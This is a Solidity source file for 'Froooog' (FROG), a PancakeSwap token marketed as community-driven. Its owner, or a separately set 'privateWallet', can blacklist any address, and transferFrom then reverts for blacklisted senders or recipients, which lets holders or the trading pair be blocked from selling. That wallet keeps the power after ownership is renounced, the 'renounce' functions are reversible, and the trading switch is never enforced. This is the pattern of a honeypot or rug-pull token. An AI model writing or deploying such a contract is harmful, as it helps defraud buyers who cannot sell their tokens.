/**
 *
 * █▄─▄▄─█▄─▄▄▀█─▄▄─█─▄▄▄▄█
 * ██─▄████─▄─▄█─██─█─██▄─█
 * ▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▄▀▄▄▄▄▄▀
 * ▀▄▀▄▀▄ FROOOOG.COM ▄▀▄▀▄▀     
 *
 * Join The Web3 Social Network!
 * For teh People 
 * 1,000,000,000,000,000 Max Supply
 * Community-driven
 *
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Context is used as a base contract for the others, it provides basic information about the transaction sender and data.
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        return msg.data;
    }
}

// IERC20 defines the standard ERC-20 token interface.
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

// Ownable is a contract that provides basic authorization control functions.
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// IPancakeFactory defines the interface for the PancakeSwap factory contract.
interface IPancakeFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

// IPancakeRouter02 defines the interface for the PancakeSwap Router contract.
interface IPancakeRouter02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    )
        external
        returns (
            uint amountA,
            uint amountB,
            uint liquidity
        );

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (
            uint amountToken,
            uint amountETH,
            uint liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// SafeMath is a library that provides arithmetic operations with safety checks.
library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

// Froooog is the main contract that implements the ERC-20 token functionality.
contract Froooog is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string public constant name = "Froooog";
    string public constant symbol = "FROG";
    uint8 public constant decimals = 18;
    uint256 private _totalSupply = 1_000_000_000_000_000 ether;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isBlacklisted;

    address public privateWallet;
    address public PANCAKESWAP_V2_PAIR;
    IPancakeRouter02 public PANCAKESWAP_V2_ROUTER;

    bool private tradingEnabled = false;

    event AddressBlacklisted(address indexed account, bool isBlacklisted);
    event TokensRecovered(address indexed token, address indexed to, uint256 amount);
    event BlacklistControlRenounced(address indexed renouncer);
    event UnblacklistControlRenounced(address indexed renouncer);
    event TradingEnabled(address indexed owner);

    constructor() {
        _balances[msg.sender] = _totalSupply;

        // Initialize PancakeSwap V2 Router
        PANCAKESWAP_V2_ROUTER = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // BSCV2 Router

        // Create PancakeSwap V2 pair
        address _pancakePair = IPancakeFactory(PANCAKESWAP_V2_ROUTER.factory()).createPair(address(this), PANCAKESWAP_V2_ROUTER.WETH());
        PANCAKESWAP_V2_PAIR = _pancakePair;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[msg.sender] >= amount, "ERC20: transfer amount exceeds balance");

        if (_isBlacklisted[recipient]) {
            revert("Recipient is blacklisted");
        }

        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(msg.sender, recipient, amount);

        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");

        if (_isBlacklisted[sender] || _isBlacklisted[recipient]) {
            revert("Sender or recipient is blacklisted");
        }

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);

        emit Transfer(sender, recipient, amount);

        return true;
    }

    function renounceBlacklistControl() external onlyOwner {
        emit BlacklistControlRenounced(owner());
        privateWallet = address(0);
    }

    function renounceBlacklistControlByPrivateWallet() external onlyPrivateWallet {
        emit BlacklistControlRenounced(privateWallet);
        privateWallet = address(0);
    }

    function renounceUnblacklistControl() external onlyOwner {
        emit UnblacklistControlRenounced(owner());
        privateWallet = address(0);
    }

    function renounceUnblacklistControlByPrivateWallet() external onlyPrivateWallet {
        emit UnblacklistControlRenounced(privateWallet);
        privateWallet = address(0);
    }

    function isBlacklisted(address account) public view returns (bool) {
        return _isBlacklisted[account];
    }

    function blacklistAddress(address account) external onlyOwnerOrPrivateWallet {
        _isBlacklisted[account] = true;
        emit AddressBlacklisted(account, true);
    }

    function unblacklistAddress(address account) external onlyOwnerOrPrivateWallet {
        _isBlacklisted[account] = false;
        emit AddressBlacklisted(account, false);
    }

    function setPrivateWallet(address _privateWallet) external onlyOwner {
        privateWallet = _privateWallet;
    }

    function recoverTokens(address tokenAddress, address to, uint256 amount) external onlyOwnerOrPrivateWallet {
        require(tokenAddress != address(this), "Cannot recover native token");
        require(tokenAddress != address(0), "Invalid token address");
        require(to != address(0), "Invalid recipient address");
        require(amount > 0, "Amount must be greater than zero");

        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));

        require(balance >= amount, "Not enough tokens to recover");

        token.transfer(to, amount);

        emit TokensRecovered(tokenAddress, to, amount);
    }

    function approveMax(address spender) external returns (bool) {
        _allowances[msg.sender][spender] = type(uint256).max;
        emit Approval(msg.sender, spender, type(uint256).max);
        return true;
    }

    function startTrading() external onlyOwner {
        tradingEnabled = true;
        emit TradingEnabled(owner());
    }

    function setRouterAddress(address newRouter) external onlyOwner {
        PANCAKESWAP_V2_ROUTER = IPancakeRouter02(newRouter);
    }

    modifier onlyOwnerOrPrivateWallet() {
        require(msg.sender == owner() || msg.sender == privateWallet, "Not authorized");
        _;
    }

    modifier onlyNotBlacklisted() {
        require(!_isBlacklisted[msg.sender], "Address is blacklisted");
        _;
    }

    modifier onlyPrivateWallet() {
        require(privateWallet != address(0) && msg.sender == privateWallet, "Not authorized");
        _;
    }
}